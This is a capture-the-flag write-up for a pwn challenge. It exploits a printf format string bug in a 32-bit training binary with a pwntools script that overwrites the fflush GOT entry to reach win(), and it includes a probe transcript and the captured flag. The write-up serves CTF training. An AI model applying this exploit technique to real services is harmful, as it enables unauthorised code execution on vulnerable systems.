---
title: reto17
challenge_type: Pwn
difficulty: Insane
author: "@4nimanegra"
writeup_author: "@xabito"
competition: navarra-cyber-talent-25-4
summary: We have a program running through a socket. Its input and output have been redirected through the socket so that you can use it as if you were running it on your own machine.
connections:
  - url: nct25.thehackerconclave.es:26017
attachments:
  - title: pwnme
    url: /assets/files/navarra-cyber-talent-25-4/reto17/pwnme
  - title: pwnme.c
    url: /assets/files/navarra-cyber-talent-25-4/reto17/pwnme.c
---

## Recon

The challenge provides a 32-bit ELF binary along with its source code:

```bash
$ file pwnme
pwnme: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5c76b17630545fe250e7215891c17dfcc284fc63, for GNU/Linux 3.2.0, not stripped
```

By reviewing the code, we can see that the objective is to exploit a vulnerability in the binary to call the `win()` function and retrieve the flag from `/flag/flag.txt`.

```c
void win() {
    system("cat /flag/flag.txt");
    exit(0);
}
```

First, let's examine the symbols and addresses of all the functions present in the binary:

```bash
$ nm pwnme | grep -E "win|dummy|vuln|main"
080491b6 T win
080491e4 T dummy
0804920f T vuln
080492c8 T main
```

The target function, `win`, is located at address `0x080491b6`. Additionally, at line 22 of the code, user input is used directly as the format string in a call to `printf(buffer)`. This introduces a classic **format string vulnerability**.

```c
void vuln() {
    char buffer[128];

    printf("Give me an input: ");
    fflush(stdout);

    fgets(buffer, sizeof(buffer), stdin);
    printf(buffer);  // FORMAT STRING VULNERABILITY

    printf("\ngive me more data: ");
    fflush(stdout);

    fgets(buffer, sizeof(buffer), stdin);
}
```

This vulnerability enables an attacker to read from and write to arbitrary memory locations by leveraging the `%n` format specifier. After the vulnerable `printf` statement executes, the program calls `fflush(stdout)`. Upon analyzing the binary’s Global Offset Table (GOT), we find several relevant entries:

```bash
$ objdump -R pwnme
OFFSET   TYPE              VALUE
0804c000 R_386_JUMP_SLOT   setbuf
0804c004 R_386_JUMP_SLOT   __libc_start_main
0804c008 R_386_JUMP_SLOT   printf
0804c00c R_386_JUMP_SLOT   fflush  # Target
0804c010 R_386_JUMP_SLOT   fgets
0804c014 R_386_JUMP_SLOT   puts
0804c018 R_386_JUMP_SLOT   system
0804c01c R_386_JUMP_SLOT   exit
```

If we overwrite the GOT entry for `fflush` with the address of the `win` function, the next time `fflush` is called, it will execute `win`, causing the flag to be printed.

## Exploitation

First, we need to determine the stack position of our input relative to the arguments processed by the format string. We accomplish this by sending two unique marker strings, followed by a sequence of format specifiers:

```bash
$ nc nct25.thehackerconclave.es 26017
Give me the password
password: AAAABBBB.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
AAAABBBB.0x80.0xf70fd5c0.0x804921e.0x41414141.0x42424242.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e
```

In this test, we send the marker strings `AAAA` and `BBBB`, followed by 15 `%p` format specifiers. The `%p` specifier prints each corresponding stack value as a pointer, allowing us to determine the stack positions of our inputs. Upon reviewing the output, we see that our markers, `AAAA` (`0x41414141`) and `BBBB` (`0x42424242`), appear at the fourth and fifth positions on the stack, respectively. Thus, the format string offsets for our addresses are `4` and `5`.

Next, we will use `pwntools` to exploit this vulnerability:

```python
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

win_addr = 0x080491b6
fflush_got = 0x0804c00c

p = remote('nct25.thehackerconclave.es', 26017)

p.recvuntil(b'Give me an input: ')

# Place fflush_got addresses at start of payload (positions 4 and 5 on stack)
payload = p32(fflush_got)       # Position 4: address to write lower bytes
payload += p32(fflush_got + 2)  # Position 5: address to write upper bytes

# Write lower 2 bytes of the win function's address (0x91b6 = 37302) to fflush_got
# We've already printed 8 bytes, so print (37302 - 8) = 37294 more
payload += b'%37294c'  # Print padding
payload += b'%4$hn'    # Write to address at position 4

# Write upper 2 bytes of the win function's address (0x0804 = 2052) to fflush_got+2
# We need to wrap around: (65536 + 2052 - 37302) = 30286
payload += b'%30286c'  # Print padding for wraparound
payload += b'%5$hn'    # Write to address at position 5

p.sendline(payload)

response = p.recvall(timeout=3)

flag_match = re.search(rb'conclave\{[a-f0-9]{32}\}', response)
if flag_match:
    flag = flag_match.group(0).decode()
    log.success(f"Flag: {flag}")
```

### How the exploit works

The payload starts with two addresses, totaling 8 bytes: `fflush_got` (`0x0804c00c`) is placed at stack position `4`, and `fflush_got + 2` (`0x0804c00e`) at stack position `5`.

The format string `%37294c%4$hn` instructs the program to print 37,294 characters, resulting in a total of 37,302 characters printed (`8 + 37,294`). The `%4$hn` directive then writes this value (`0x91b6`) as a 2-byte integer to the memory address located at stack position `4`, which corresponds to `fflush_got`.

Thanks to integer overflow in the character count, it is possible to write a smaller value after a larger one. The format string `%30286c%5$hn` causes the program to print 30,286 additional characters, resulting in a total of 67,588 (`0x10804`). When this value is truncated to 2 bytes, it becomes `0x0804`. The `%5$hn` directive then writes this value to the address at `fflush_got+2`.

After `printf` returns, the program calls `fflush(stdout)`. However, since we have overwritten the GOT entry at `0x0804c00c` with the address of `win` (`0x080491b6`), the call to `fflush` is redirected to `win`.

## Flag Capture

Executing the exploit retrieves the flag successfully:

```
[+] Opening connection to nct25.thehackerconclave.es on port 26017: Done
[+] Receiving all data: Done (66.07KB)
[*] Closed connection to nct25.thehackerconclave.es port 26017
[+] Flag: conclave{ef6f2a99c1ae0ef9bf26055be3b746bb}
```
